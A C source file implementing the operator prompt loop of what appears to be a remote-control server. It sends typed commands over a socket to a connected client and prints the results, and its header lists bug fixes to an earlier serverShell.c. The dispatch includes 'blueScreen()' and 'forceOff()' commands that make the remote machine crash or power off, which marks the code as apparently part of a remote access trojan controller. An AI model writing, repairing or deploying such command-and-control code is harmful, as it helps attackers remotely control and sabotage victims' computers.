/*
 * server/prompt.c  –  Operator prompt loop implementation
 * =========================================================
 * Implements run_prompt_loop() declared in prompt.h.
 *
 * Fixes applied vs. original serverShell.c
 * -----------------------------------------
 *  FIX 1: write() sent the full 1024-byte buffer (including NUL padding).
 *          Now sends only strlen(buffer) bytes — the exact command string.
 *
 *  FIX 2: "forceOff()" strncmp comparison length was 12.
 *          "forceOff()" is 10 characters; comparing 12 reads 2 bytes past
 *          the string literal boundary.  Corrected to 10.
 *
 *  FIX 3: Dangling else — the original if/if/if/else chain attached the
 *          `else { recv() }` block only to the last `if (forceOff)`, so
 *          after sending "blueScreen()" the server would still call recv()
 *          and block waiting for a response that would never arrive.
 *          Replaced with an explicit if/else-if/else-if/else ladder.
 *
 *  FIX 4: write() and recv() return values were unchecked.
 *          Both are now tested; the loop breaks on error.
 *
 *  FIX 5: Unreachable jmp: label removed (was never jumped to).
 *
 *  FIX 6: Unused variable `n` removed.
 */

#include "prompt.h"
#include "config.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

void run_prompt_loop(int clientFd, const struct sockaddr_in *clientAddr)
{
    char    buffer[CMD_BUF_SIZE];
    char    cResp[RESP_BUF_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(cResp,  0, sizeof(cResp));

        /* Print the operator prompt: <client_ip>~$: */
        printf("%s~$: ", inet_ntoa(clientAddr->sin_addr));
        fflush(stdout);

        /* Read a command from stdin; break on EOF */
        if (fgets(buffer, sizeof(buffer), stdin) == NULL) break;
        strtok(buffer, "\n");  /* strip the trailing newline */

        /* FIX 1: send only the actual command bytes, not the whole buffer */
        size_t cmdLen = strlen(buffer);
        if (cmdLen == 0) continue;

        if (write(clientFd, buffer, cmdLen) < 0) { /* FIX 4 */
            perror("write");
            break;
        }

        /* ── Command dispatch ───────────────────────────────────────────
         * FIX 3: explicit if/else-if ladder so every branch is unambiguous.
         * Commands that do not produce a response (q, blueScreen, forceOff)
         * must NOT call recv() — the client exits without sending anything.
         * ─────────────────────────────────────────────────────────────── */

        /* FIX: strncmp("q",buffer,1) matches any command starting with 'q'.
         * "q" is exactly one character; require cmdLen == 1.              */
        if (cmdLen == 1 && buffer[0] == 'q') {
            /* Clean disconnect — client will close */
            break;
        }
        else if (strncmp("blueScreen()", buffer, 12) == 0) {
            /* Client triggers BSOD — no response expected */
            break;
        }
        else if (strncmp("forceOff()", buffer, 10) == 0) { /* FIX 2: was 12 */
            /* Client powers off — no response expected */
            break;
        }
        else {
            /* General command — read and print the response */
            /* FIX: do NOT use MSG_WAITALL — it blocks until the buffer is
             * completely full (18382 bytes).  A normal response is much
             * shorter; MSG_WAITALL would hang forever.  Use a plain recv()
             * which returns as soon as any data is available.              */
            ssize_t nRecv = recv(clientFd, cResp, sizeof(cResp) - 1, 0);
            if (nRecv <= 0) { /* FIX 4 */
                if (nRecv < 0) perror("recv");
                break;
            }
            cResp[nRecv] = '\0';
            printf("%s\n", cResp);
        }
    }
}
